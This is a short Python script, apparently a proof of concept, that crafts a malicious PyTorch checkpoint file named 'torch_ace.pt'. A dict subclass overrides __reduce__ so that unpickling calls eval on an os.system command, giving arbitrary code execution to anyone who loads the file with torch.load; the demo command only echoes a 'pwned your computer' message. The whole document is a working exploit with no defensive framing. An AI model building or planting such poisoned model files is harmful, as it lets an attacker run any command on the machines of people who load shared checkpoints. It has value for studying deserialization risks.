import torch


class BadDict(dict):
    def __init__(self, src: str, **kwargs):
        super().__init__(**kwargs)
        self.src = src

    def __reduce__(self):
        return (
            eval,
            (f"os.system('{self.src}') or dict()",),
            None,
            None,
            iter(self.items()),
        )


torch.save(
    BadDict(
        'echo "pwned your computer, I can do anything I want."',
        **{"weight": torch.zeros((2, 2))},
    ),
    "torch_ace.pt",
)
